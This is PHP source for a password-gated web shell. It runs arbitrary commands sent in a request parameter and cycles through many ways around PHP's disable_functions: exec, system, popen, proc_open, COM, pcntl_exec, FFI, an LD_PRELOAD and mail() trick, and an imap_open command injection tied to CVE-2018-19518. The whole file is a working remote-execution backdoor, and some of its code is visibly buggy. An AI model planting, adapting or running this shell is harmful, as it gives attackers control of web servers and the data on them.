<?php
    $INFO = array(
        "OS" => strpos("linux",strtolower(PHP_OS)) === false?"windows":"linux",
        "PASS" => "haha",
        "BASE64" => 0,
        "DISABLE_FUNC" => @preg_split(",",ini_get("disable_functions"))===false?array(""):@preg_split(",",ini_get("disable_functions")),
        "flag" => "<br/><b>Using method:</b><font color='red'>",
        "PHP_VER" => PHP_VERSION,

    );
    $INFO["OUT"] = $INFO["OS"] === "linux"?"/tmp/.SK39s4LSI4l2xso~":"c:\\windows\\temp\\_SLeiks23ls~";
    $INFO["IN"] = $INFO["OS"] === "linux"?"/tmp/.SO34092ls2934l12sdl~":"c:\\windows\\temp\\_loS439sl4iLq~";
    if(!isset($_REQUEST[$INFO["PASS"]])){
        exit();
    }else{
        $INFO["c"] = $_REQUEST[$INFO["PASS"]];
    }
    function m_exec(){
        global $INFO;
        if(in_array("exec",$INFO["DISABLE_FUNC"])){
            return false;
        }
        @exec($INFO['c'],$o);
        foreach($o as $v){
            echo $v."<br/>";
        }
        exit("{$INFO["flag"]}exec");
    }
    function m_system(){
        global $INFO;
        if(in_array("system",$INFO["DISABLE_FUNC"])){
            return false;
        }
        @system($INFO["c"]);
        exit("{$INFO["flag"]}system");
    }
    function m_shell_exec(){
        global $INFO;
        if(in_array("shell_exec",$INFO['DISABLE_FUNC'])
        ){
            return false;
        }
        $o = @shell_exec($INFO["c"]);
        echo nl2br($o);
        exit("{$INFO['flag']}shell_exec");
    }
    function m_popen(){
        global $INFO;
        if(in_array("popen",$INFO['DISABLE_FUNC'])
        ){
            return false;
        }
        $fp = @popen($INFO["c"],"r");  //popen打一个进程通道
        while (!feof($fp)) {      //从通道取出内容
            $out = fgets($fp, 4096);
            echo  $out."<br/>";
        }
        pclose($fp);
        exit("{$INFO['flag']}popen");

    }
    function m_proc_open()
    {
        global $INFO;
        if (in_array("proc_open", $INFO['DISABLE_FUNC'])
        ){
            return false;
        }
        $array = array(
            array("pipe", "r"),   //标准输入
            array("pipe", "w"),   //标准输出内容
            array("pipe", "w")    //标准输出错误
        );
        $fp = proc_open($INFO["c"],$array,$pipes);
        $o = stream_get_contents($pipes[1]);
        echo nl2br($o);
        proc_close($fp);
        exit("{$INFO['flag']}proc_open");
    }
    function windows_com(){
        global $INFO;
        if(!class_exists("COM")
        ){
            return false;
        }
        $wsh = new COM('WScript.shell'); // 生成一个COM对象　Shell.Application也能
        $exec = $wsh->exec("cmd /c".$INFO["input"]); //调用对象方法来执行命令
        $stdout = $exec->StdOut();
        $stroutput = $stdout->ReadAll();
        echo nl2br($stroutput);
        exit("{$INFO["flag"]}windows_com");
    }
    function m_pcntl_exec()
    {
        global $INFO;
        if(in_array("pcntl_exec",$INFO["DISABLE_FUNC"]) or !function_exists("pcntl_exec")){
            return false;
        }
        @unlink($INFO["IN"]);
        @unlink($INFO["OUT"]);
        $c = "#!/usr/bin/env bash\n{$INFO['c']} > {$INFO['OUT']}\n";
        file_put_contents($INFO["IN"], $c);
        chmod($INFO["IN"], 0777);

        switch (pcntl_fork()) {
            case 0:
                $ret = pcntl_exec($INFO["IN"]);
                exit("case 0");
            default:
                sleep(1);
                echo nl2br(file_get_contents($INFO["OUT"]));
                @unlink($INFO["OUT"]);
                @unlink($INFO["IN"]);
                break;
        }
        exit("{$INFO["flag"]}pcntl_exec");
    }
    function php_ffi(){
        global $INFO;
        if(!class_exists("FFI") or ini_get("ffi.enable")!=="1"){
            return false;
        }
        @unlink($INFO["OUT"]);
        $ffi = FFI::cdef("int system(char *command);");
        $ffi->system("{$INFO['c']} > {$INFO['OUT']} 2>&1");
        echo nl2br(file_get_contents($INFO["OUT"]));
        @unlink($INFO["OUT"]);
        exit("{$INFO["flag"]}php_ffi");

    }
    function ld_preload(){
        global $INFO;
        if(in_array("putenv",$INFO["DISABLE_FUNC"]) or in_array("mail",$INFO["DISABLE_FUNC"]) or $INFO["OS"] !== "linux"){
            return false;
        }
        if(!isset($_GET["so_path"])){
            echo "输入上传的so文件路径:\$_GET['so_path']";
        }else {
            $evil_cmdline = $INFO["c"] . " > " . $INFO["OUT"] . " 2>&1";
            putenv("EVIL_CMDLINE=" . $evil_cmdline);
            $so_path = "/var/www/html/evil.so";
            putenv("LD_PRELOAD=" . $so_path);
            @mail("", "", "", "");
            echo nl2br(file_get_contents($INFO["OUT"]));
            @unlink($INFO["OUT"]);
        }
        exit("{$INFO['flag']}ld_preload");
    }
    function m_passthru(){
        global $INFO;
        if(in_array("passthru",$INFO["DISABLE_FUNC"])){
            return false;
        }
        passthru($INFO["c"]);
        exit("{$INFO['flag']}passthru");
    }
    function m_imap_open(){
        //CVE-2018-19518
        global $INFO;
        if(in_array("imap_open",$INFO["DISABLE_FUNC"])
        or ini_get("imap.enable_insecure_rsh") === "0"
        or !function_exists("imap_open")
        ){
            return false;
        }
        $server = "x -oProxyCommand=echo\t" . base64_encode($INFO["c"] . ">".$INFO["OUT"]) . "|base64\t-d|sh}";
        @imap_open('{' . $server . ':143/imap}INBOX', '', ''); // or var_dump("\n\nError: ".imap_last_error());
        sleep(5);
        echo file_get_contents($INFO["OUT"]);
        exit("{$INFO['flag']}imap_open");
    }
    //cgi
    //破壳
    //imagemagic

    m_exec();
    m_shell_exec();
    m_popen();
    m_proc_open();
    m_system();
    m_passthru();
    windows_com();
    ld_preload();
    m_pcntl_exec();
    php_ffi();
    m_imap_open();
